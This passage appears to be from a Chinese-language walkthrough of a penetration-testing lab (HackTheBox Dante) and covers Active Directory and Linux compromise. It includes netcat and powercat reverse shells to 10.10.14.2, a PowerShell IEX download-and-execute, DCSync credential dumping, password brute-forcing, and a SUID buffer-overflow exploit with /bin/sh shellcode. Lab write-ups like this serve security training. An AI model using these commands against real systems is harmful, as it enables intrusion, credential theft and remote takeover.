plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># proxychains4 ldapsearch -x -H ldap://172.16.1.20:389 -D &quot;CN=xadmin,CN=Users,DC=DANTE,DC=local&quot; -w Peacemaker! -b &quot;DC=DANTE,DC=local&quot; &quot;(&amp;(objectCategory=computer)(objectClass=computer))&quot; CN | grep cn  </span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.20:389  ...  OK</span><br><span class="line">cn: DANTE-DC01</span><br></pre></td></tr></table></figure><p>因此拿到域管账户似乎也无济于事。</p><h3 id="Update-the-policy"><a href="#Update-the-policy" class="headerlink" title="Update the policy!"></a>Update the policy!</h3><p>那接着我们看172.16.1.101这台机子，nmap扫描之后开放的端口有21、135、139、445、5040、5985。之后尝试ftp匿名登录，无果。尝试利用之前excel中拿到的username和password爆破：</p><p><a href="https://pic.imgdb.cn/item/646252f30d2dde57779d66b2.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646252f30d2dde57779d66b2.jpg"></a></p><p>得到一组可以成功登录ftp的帐号密码：<code>dharding:WestminsterOrange5</code>，ftp登录后，得到一个叫”Remote login.txt“的文件，文件内容如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Dido,</span><br><span class="line">I&#x27;ve had to change your account password due to some security issues we have recently become aware of</span><br><span class="line"></span><br><span class="line">It&#x27;s similar to your FTP password, but with a different number (ie. not 5!)</span><br><span class="line"></span><br><span class="line">Come and see me in person to retrieve your password.</span><br><span class="line"></span><br><span class="line">thanks,</span><br><span class="line">James</span><br></pre></td></tr></table></figure><p>提示dharding的账户密码与FTP密码类似，只是最后一位数字5发生了改变，那我们先用for循环生成一个密码字典：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;0..100&#125;;do echo &quot;WestminsterOrange$i&quot; &gt;&gt; pass1.txt;done</span><br></pre></td></tr></table></figure><p>之后用cme开始爆破，成功得到账户密码为<code>dharding:WestminsterOrange17</code>：</p><p><a href="https://pic.imgdb.cn/item/646252b80d2dde57779c9e54.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646252b80d2dde57779c9e54.jpg"></a></p><p>用evil-winrm登录即可在桌面拿到flag：</p><p><a href="https://pic.imgdb.cn/item/646253470d2dde57779e74e7.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646253470d2dde57779e74e7.jpg"></a></p><h3 id="Single-or-double-quotes"><a href="#Single-or-double-quotes" class="headerlink" title="Single or double quotes"></a>Single or double quotes</h3><p>之后我们可以在“C:\Program Files (x86)\IObit”目录下看到“IObit Uninstaller”，查看IObit Uninstaller目录下的History.txt：</p><p><a href="https://pic.imgdb.cn/item/6462595b0d2dde5777ad58f2.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462595b0d2dde5777ad58f2.jpg"></a></p><p>该版本的IObit Uninstaller存在通过可信任服务路径提权的问题。但是此处我们却不是通过这个问题来提权的，我们执行一下<code>cmd.exe /c &quot;sc qc IObitUnSvr&quot;</code>，结果如下：</p><p><a href="https://pic.imgdb.cn/item/646259c00d2dde5777ae4234.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646259c00d2dde5777ae4234.jpg"></a></p><p>可以看到IObitUnSvr服务的二进制路径中已经不存在空格了。但是这个服务是以system权限启动的，所以我们可能仍然需要通过这个服务来提权，只是需要另寻它法。因为这台机子powershell的执行策略，我们不能直接使用Get-ServiceAcl.ps1获取服务的ACL，执行<code>Get-ExecutionPolicy</code>可以看到执行策略显示Restricted：</p><p><a href="https://pic.imgdb.cn/item/646257b60d2dde5777a956e2.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646257b60d2dde5777a956e2.jpg"></a></p><p>直接执行Set-ExecutionPolicy Unrestricted又会提示我们拒绝更改。可以利用以下语句查看：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-ExecutionPolicy</span> Bypass <span class="literal">-Command</span> <span class="string">&quot;&amp; &#123;Import-Module C:\Users\dharding\Documents\Get-ServiceAcl.ps1;&#x27;IObitUnSvr&#x27; | Get-ServiceAcl | select -ExpandProperty Access&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>结果为：</p><p><a href="https://pic.imgdb.cn/item/6462584e0d2dde5777aaea36.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462584e0d2dde5777aaea36.jpg"></a></p><p>可以看到dharding用户拥有查询、更改“IObitUnSvr”服务配置的权限，还拥有开始和关闭该服务的权限。那这直接改IObitUnSvr服务的二进制路径不就直接getsystem了吗？接下来我们上传一个nc程序，之后利用以下语句更改服务的二进制程序路径：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe config IObitUnSvr binPath=<span class="string">&quot;cmd.exe /c C:\Users\dharding\Desktop\nc64.exe -e cmd.exe 10.10.14.2 1238&quot;</span></span><br></pre></td></tr></table></figure><p>执行之后再次查看服务配置，可以看到二进制程序路径已经发生了改变：</p><p><a href="https://pic.imgdb.cn/item/64625c2f0d2dde5777b3a3c9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64625c2f0d2dde5777b3a3c9.jpg"></a></p><p>之后sc stop IObitUnSvr再sc start IObitUnSvr重启服务，即可拿到system shell：</p><p><a href="https://pic.imgdb.cn/item/64625c600d2dde5777b40ebb.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64625c600d2dde5777b40ebb.jpg"></a></p><h3 id="An-open-goal"><a href="#An-open-goal" class="headerlink" title="An open goal"></a>An open goal</h3><p>接着我们看172.16.1.5这台机子，fscan扫描结果显示开放了21、135、139、445以及1433端口，1433端口一般被mssql占用。 首先ftp匿名登录，拿到第一个flag：</p><p><a href="https://pic.imgdb.cn/item/64625e1c0d2dde5777b7e878.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64625e1c0d2dde5777b7e878.jpg"></a></p><p>因为没有帐号和密码，我们无法连接smb和mssql，因此这台机子先暂时搁置。打后面的机子再看看有没有线索。</p><h3 id="It’s-getting-hot-in-here"><a href="#It’s-getting-hot-in-here" class="headerlink" title="It’s getting hot in here"></a>It’s getting hot in here</h3><p>因为之前的Dante-DC01通过ms17-010打经常session维持不起来，没一会儿就掉了，所以我这里是利用之前得到的域管帐号通过evil-winrm登录进去，并上传msf马，运行木马拿到的meterpreter。，执行ipconfig之后看到有三张网卡：</p><p><a href="https://pic.imgdb.cn/item/646261570d2dde5777c1248d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646261570d2dde5777c1248d.jpg"></a></p><p>猜测可能还存在一个网段，利用以下cmd命令扫一下172.16.2.0&#x2F;24这个段吧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find &quot;Reply&quot;</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/6462623a0d2dde5777c2f8b7.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462623a0d2dde5777c2f8b7.jpg"></a></p><p>发现还有一台IP为172.16.2.5的主机。之后添加路由，把172.16.2.0&#x2F;24这个段给添加进来（run autoroute -s 172.16.2.0&#x2F;24），扫一波端口：</p><p><a href="https://pic.imgdb.cn/item/646264930d2dde5777c7aaf6.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646264930d2dde5777c7aaf6.jpg"></a></p><p>这台主机运行着DNS、Kerberos还有LDAP，应该又是一台DC。建立一条代理：</p><p><a href="https://pic.imgdb.cn/item/646266d50d2dde5777cc4c77.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646266d50d2dde5777cc4c77.jpg"></a></p><p>之后我们会通过这条代理打172.16.2.5。故技重施利用ms17-010打172.16.2.5，没成功：</p><p><a href="https://pic.imgdb.cn/item/6462676d0d2dde5777cd60cb.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462676d0d2dde5777cd60cb.jpg"></a></p><p>那接下来就对域内用户进行枚举吧。了解Kerberos协议的师傅应该知道域内用户枚举的原理，大致就是因为AS_REQ发送的请求包中cname字段的正确与否，导致AS_REP响应包的不同来进行枚举的。首先我们进行端口转发，把88端口和53端口转发到本地：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -L 127.0.0.1 -l 53 -p 53 -r 172.16.2.5</span><br><span class="line">portfwd add -L 127.0.0.1 -l 88 -p 88 -r 172.16.2.5</span><br></pre></td></tr></table></figure><p>之后使用kerbrute进行域用户名枚举，用户名字典是之前从excel文件中读到那些username：</p><p><a href="https://pic.imgdb.cn/item/64626de60d2dde5777d89f05.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64626de60d2dde5777d89f05.jpg"></a></p><p>之后利用cme爆破密码，跑了一夜，睡觉去了，醒来发现没结果，我知道是时候放弃直接爆破密码了。此时我们手上已经有了一个域用户的username，但没有该用户的密码，因此无法进行Kerberoasting攻击，但是可以进行AS_REP Roasting攻击。AS_REP Roasting攻击是因为域用户勾选了”不要求Kerberos预身份验证“的选项，攻击者进行AS_REQ之后，KDC会不作任何验证便将 TGT 票据和加密的 Session-key 等信息返回，即AS_REP。攻击者可以对由用户的NTLM Hash加密之后的Session-key 进行离线破解，如果爆破成功，就能得到该指定用户的明文密码。 impacket的GetNPUsers.py脚本为我们提供了进行AS_REP Roasting攻击的工具：</p><p><a href="https://pic.imgdb.cn/item/646273290d2dde5777e05761.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646273290d2dde5777e05761.jpg"></a></p><p>之后我们利用john对该Hash进行爆破：</p><p><a href="https://pic.imgdb.cn/item/646274830d2dde5777e2716c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646274830d2dde5777e2716c.jpg"></a></p><p>之后利用evil-winrm登录就行了，Desktop目录下拿到flag：</p><p><a href="https://pic.imgdb.cn/item/646274fe0d2dde5777e30ea3.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646274fe0d2dde5777e30ea3.jpg"></a></p><h3 id="One-misconfig-to-rule-them-all"><a href="#One-misconfig-to-rule-them-all" class="headerlink" title="One misconfig to rule them all"></a>One misconfig to rule them all</h3><p>之后我们上传SharpHound.exe采集数据，导入进BloodHound，点击分析里的<code>Find Principalswith DCSync Rights</code>选项卡，可以发现jbercov可以对dante.admin域进行DCSync攻击。利用impacket的secretsdump.py脚本进行攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q python3 secretsdump.py dante/jbercov:myspace7@172.16.2.5 -just-dc-user Administrator</span><br></pre></td></tr></table></figure><p>抓到了Administrator的密码Hash：</p><p><a href="https://pic.imgdb.cn/item/64627ad50d2dde5777e91601.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64627ad50d2dde5777e91601.jpg"></a></p><p>之后我们可以通过PTH的方法配合使用psexec工具来拿到system权限：</p><p><a href="https://pic.imgdb.cn/item/64627c730d2dde5777ebf3f8.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64627c730d2dde5777ebf3f8.jpg"></a></p><p>也可以通过msf的psexec模块来返回一个meterpreter：</p><p><a href="https://pic.imgdb.cn/item/64627dff0d2dde5777ed71af.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64627dff0d2dde5777ed71af.jpg"></a></p><p>之后我们上传chisel，创建一条代理：</p><p><a href="https://pic.imgdb.cn/item/64627e260d2dde5777ed8a8f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64627e260d2dde5777ed8a8f.jpg"></a></p><p>在C:\Users\Administrator\Documents目录处存在一个Jenkins.bat文件，内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user Admin_129834765 SamsungOctober102030 /add</span><br></pre></td></tr></table></figure><h3 id="We’re-going-in-circles"><a href="#We’re-going-in-circles" class="headerlink" title="We’re going in circles"></a>We’re going in circles</h3><p>在172.16.1.19的8080端口上运行着Jenkins服务，利用密码可以成功登录：</p><p><a href="https://pic.imgdb.cn/item/6462803c0d2dde5777eecc0b.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462803c0d2dde5777eecc0b.jpg"></a></p><p>接着我们进入&#x2F;script目录，利用以下语句进行命令执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println &quot;ls -al&quot;.execute().text</span><br></pre></td></tr></table></figure><p>之后拿到meterpreter，此时用户为jenkins:</p><p><a href="https://pic.imgdb.cn/item/6462819a0d2dde5777eff151.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462819a0d2dde5777eff151.jpg"></a></p><p>之后上传pspy发现以下进程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2023/05/13 10:23:01 CMD: UID=0    PID=12129  | /bin/sh -c /bin/bash mysql -u ian -p VPN123ZXC</span><br></pre></td></tr></table></figure><p>得到一组帐号密码：<code>ian:VPN123ZXC</code>，直接su切换至ian用户，发现在disk组里：</p><p><a href="https://pic.imgdb.cn/item/646282340d2dde5777f098c5.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646282340d2dde5777f098c5.jpg"></a></p><p>hacktricks里对disk组提权的方法进行了介绍：<a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group</a> 首先我们看看&#x2F;dev设备里有哪些所属组是disk：</p><p><a href="https://pic.imgdb.cn/item/6462831f0d2dde5777f12980.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462831f0d2dde5777f12980.jpg"></a></p><p>之后执行<code>df -h</code>看看根目录被挂载到了哪里：</p><p><a href="https://pic.imgdb.cn/item/6462835e0d2dde5777f14d65.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462835e0d2dde5777f14d65.jpg"></a></p><p>根目录被挂在到了&#x2F;dev&#x2F;sda5，之后就与hacktricks中介绍的方法类似了：</p><p><a href="https://pic.imgdb.cn/item/6462b1330d2dde577712466e.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462b1330d2dde577712466e.jpg"></a></p><h3 id="My-cup-runneth-over"><a href="#My-cup-runneth-over" class="headerlink" title="My cup runneth over"></a>My cup runneth over</h3><p>接下来我们在DC02中执行如下cmd命令来探测172.16.2.0&#x2F;24网段的存活主机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find &quot;Reply&quot;</span><br></pre></td></tr></table></figure><p>结果为：</p><p><a href="https://pic.imgdb.cn/item/646285760d2dde5777f2881f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646285760d2dde5777f2881f.jpg"></a></p><p>该网段还存在一个IP为172.16.2.101的主机，使用auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp模块探测一下开放的端口，发现开放了22端口。我们将22端口转发到本地：</p><p><a href="https://pic.imgdb.cn/item/64628cbd0d2dde5777f8b156.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64628cbd0d2dde5777f8b156.jpg"></a></p><p>尝试爆破一下ssh帐号和密码，用户名字典和密码字典都是从之前的excel文件中得到的。还记得我们之前爆破得出的<code>julian:manchesterunited</code>这对帐号密码吗？我们将它一起添加进字典中，使用hydra爆破，结果正是之前得到的julian：</p><p><a href="https://pic.imgdb.cn/item/64628c9b0d2dde5777f89d31.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64628c9b0d2dde5777f89d31.jpg"></a></p><p>接着用ssh登录后，尝试SUID提权：</p><p><a href="https://pic.imgdb.cn/item/64628ed70d2dde5777f9941c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64628ed70d2dde5777f9941c.jpg"></a></p><p>发现&#x2F;usr&#x2F;sbin&#x2F;readfile被设置了SUID位，复制到本地，利用<a href="https://dogbolt.org/">https://dogbolt.org/</a> 在线反编译站点对这个二进制文件进行反编译，观察Ghidra模块，其中主函数如下所示：</p><p><a href="https://pic.imgdb.cn/item/64628fa00d2dde5777fa2cf1.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64628fa00d2dde5777fa2cf1.jpg"></a></p><p>首先判断我们是否传入了参数，如果没有则输出<code>&quot;Syntax: %s &lt;/path/to/file&gt;\n</code>。否则，就将真实、有效且已保存的用户或组ID设置为root。接下来还调用了strcpy()函数，将用户输入param2复制到local_58缓冲区。local_58缓冲区长度为80,如果超过80,则会导致缓冲区溢出，并且可以用来获得主机上的root访问权限。 接下来我们执行gdb readfile，gdb还安装了peda插件，执行checksec检查二进制的各种安全选项：</p><p><a href="https://pic.imgdb.cn/item/646291440d2dde5777fb2fe8.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646291440d2dde5777fb2fe8.jpg"></a></p><p>之后，我们检查ASLR：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/646291d70d2dde5777fb773e.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646291d70d2dde5777fb773e.jpg"></a></p><p>可以看到，ASLR被关闭。使用gdb，我们生成一个100字节的模式，并使用r参数运行程序：</p><p><a href="https://pic.imgdb.cn/item/646292c90d2dde5777fbe1e7.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646292c90d2dde5777fbe1e7.jpg"></a></p><p>可以看到RSP指向我们有效载荷的一部分（AAKAAgAA6AAL）。我们搜索这个偏移量在哪里</p><p><a href="https://pic.imgdb.cn/item/6462933e0d2dde5777fc0edf.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462933e0d2dde5777fc0edf.jpg"></a></p><p>偏移量是88，因此我们用python生成88个’A’和8个’B’：</p><p><a href="https://pic.imgdb.cn/item/646293b40d2dde5777fc42c9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646293b40d2dde5777fc42c9.jpg"></a></p><p>可以看到RSP被8个’B’给填满。我们可以把B替换为我们shellcode的地址。64位的shellcode可以从<a href="http://shell-storm.org/shellcode/files/shellcode-806.html">这里</a>调用&#x2F;bin&#x2F;sh，其中”\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05”一共是27个byte，接着我们执行下面的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r $(python2 -c &#x27;print &quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot; + &quot;A&quot;*(88-27) + &quot;B&quot;*6&#x27;)</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/646295d90d2dde5777fd1790.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646295d90d2dde5777fd1790.jpg"></a></p><p>我们将使用以下命令分析堆栈的前120个字节：</p><p><a href="https://pic.imgdb.cn/item/646296620d2dde5777fd792c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646296620d2dde5777fd792c.jpg"></a></p><p>没找到shellcode，可以通过删除200个字节来分析RSP之前的内存内容：</p><p><a href="https://pic.imgdb.cn/item/646297210d2dde5777fe402c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646297210d2dde5777fe402c.jpg"></a></p><p>此时找到了shellcode。shellcode出现在内存表示中的第二个八位字节中。下一个地址是0x7fffffffe378。我们可以通过从下一个字节中删除8个字节来计算shellcode地址，0x7fffffffe370。之后我们用这个地址来代替这些’B’：</p><p><a href="https://pic.imgdb.cn/item/646298550d2dde5777ffdf7c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646298550d2dde5777ffdf7c.jpg"></a></p><p>可以看到已经成功进入shell了，可是执行id之后发现是julian：</p><p><a href="https://pic.imgdb.cn/item/646298ae0d2dde57770088c2.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646298ae0d2dde57770088c2.jpg"></a></p><p>这很正常，因为gdb调试二进制文件的时候不会提升权限。接着我们执行<code>/usr/sbin/readfile $(python2 -c &#39;print &quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot; + &quot;A&quot;*(88-27) + &quot;\x70\xe3\xff\xff\xff\x7f&quot;&#39;)</code>，结果为：</p><p><a href="https://pic.imgdb.cn/item/6462998b0d2dde5777016720.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462998b0d2dde5777016720.jpg"></a></p><p>这里的原因是gdb在堆栈中保留了一些环境变量，因此我们的shellcode在有gdb和没有gdb的情况下有不同的地址。 我们可以通过将外壳代码存储在env变量中来执行相同的攻击，然后可以指向堆栈到此变量的地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export SHELLCODE=`python2 -c &#x27;print&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;&#x27;`</span><br></pre></td></tr></table></figure><p>SHELLCODE变量的地址可以通过以下代码获得：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line">    </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">  <span class="type">char</span> *ptr;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span>(argc &lt; <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;environment variable&gt; &lt;target program name&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ptr = getenv(argv[<span class="number">1</span>]); <span class="comment">/* get env var location */</span></span><br><span class="line">  ptr += (<span class="built_in">strlen</span>(argv[<span class="number">0</span>]) - <span class="built_in">strlen</span>(argv[<span class="number">2</span>]))*<span class="number">2</span>; <span class="comment">/* adjust for program name */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s will be at %p\n&quot;</span>, argv[<span class="number">1</span>], ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后我们编译上面这段代码并运行生产的二进制文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc getenv.c -o getenv &amp;&amp; <span class="built_in">chmod</span> +x getenv &amp;&amp; ./getenv SHELLCODE /usr/sbin/readfile</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/64629b310d2dde577702312a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64629b310d2dde577702312a.jpg"></a></p><p>最后我们调整调用，这次使用了新地址，成功getroot：</p><p><a href="https://pic.imgdb.cn/item/6462b1730d2dde5777126ddf.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462b1730d2dde5777126ddf.jpg"></a></p><h3 id="What-do-we-have-here"><a href="#What-do-we-have-here" class="headerlink" title="What do we have here?!"></a>What do we have here?!</h3><p>接着我们再在这台机子上通过以下命令来查看存活主机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;1..255&#125; ;do (ping -c 1 172.16.2.$i | grep &quot;bytes from&quot;|cut -d &#x27; &#x27; -f4|tr -d &#x27;:&#x27; &amp;);done</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/64629c580d2dde577702b8d4.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64629c580d2dde577702b8d4.jpg"></a></p><p>找到了一台新机子，IP为172.16.2.6。通过扫描端口，发现开启了22端口和631端口，我们再次使用julian的帐号连上去，可以直接拿到flag：</p><p><a href="https://pic.imgdb.cn/item/6462b1930d2dde57771285b7.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462b1930d2dde57771285b7.jpg"></a></p><p>接着我们在Desktop目录下找到一个SQL文件，文件内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">julian@DANTE-ADMIN-NIX06:~/Desktop$ cat SQL</span><br><span class="line">Hi Julian</span><br><span class="line">I&#x27;ve put this on your personal desktop as its probably the most secure </span><br><span class="line">place on the network!</span><br><span class="line"></span><br><span class="line">Can you please ask Sophie to change her SQL password when she logs in</span><br><span class="line">again? I&#x27;ve reset it to TerrorInflictPurpleDirt996655 as it stands, but</span><br><span class="line">obviously this is a tough one to remember</span><br><span class="line"></span><br><span class="line">Maybe we should all get password managers?</span><br><span class="line"></span><br><span class="line">Thanks,</span><br><span class="line">James</span><br></pre></td></tr></table></figure><p>得到一组帐号密码<code>sophie:TerrorInflictPurpleDirt996655</code>。</p><h3 id="It-doesn’t-get-any-easier-than-this"><a href="#It-doesn’t-get-any-easier-than-this" class="headerlink" title="It doesn’t get any easier than this"></a>It doesn’t get any easier than this</h3><p>之后还可以在home目录下找到一个名为plongbottom的用户，而这个用户也正好在我们之前得到的那个excel文件里。因此我们直接su切换至该用户。之后执行sudo -l后，发现可以sudo执行任何命令，那直接sudo去看root目录下的flag即可：</p><p><a href="https://pic.imgdb.cn/item/64629de90d2dde577703bf5e.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64629de90d2dde577703bf5e.jpg"></a></p><h3 id="Fail-2-The-Sequel"><a href="#Fail-2-The-Sequel" class="headerlink" title="Fail 2: The Sequel"></a>Fail 2: The Sequel</h3><p>接下来，我们回过头来看172.16.1.5这台机子，之前因为没有线索而将它暂时搁置了。现在我们拿到了sophie的帐号密码，可以尝试登录一下了。利用impacket中的mssqlclient可以进行登录：</p><p><a href="https://pic.imgdb.cn/item/64629e810d2dde5777041141.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64629e810d2dde5777041141.jpg"></a></p><p>接着开始提权，首先执行<code>select is_srvrolemember(&#39;sysadmin&#39;);</code>判断当前是否为DBA权限，为1则可以提权：</p><p><a href="https://pic.imgdb.cn/item/64629edc0d2dde57770439c4.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64629edc0d2dde57770439c4.jpg"></a></p><p>接着我们 查看能否使用 xp_cmdshell，从MSSQL2005版本之后默认关闭： <code>select count(*) from master.dbo.sysobjects where xtype = &#39;x&#39; and name = &#39;xp_cmdshell&#39;</code></p><p><a href="https://pic.imgdb.cn/item/64629f180d2dde5777045812.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64629f180d2dde5777045812.jpg"></a></p><p>可以使用xp_cmdshell，我这里使用powercat来反弹shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell &quot;powershell IEX (New-Object Net.WebClient).DownloadString(\&quot;http://10.10.14.2:1241/powercat.ps1\&quot;);powercat -c 10.10.14.2 -p 1242 -e cmd&quot;</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/6462a06c0d2dde577704feac.jpg" class="gallery-item"><img 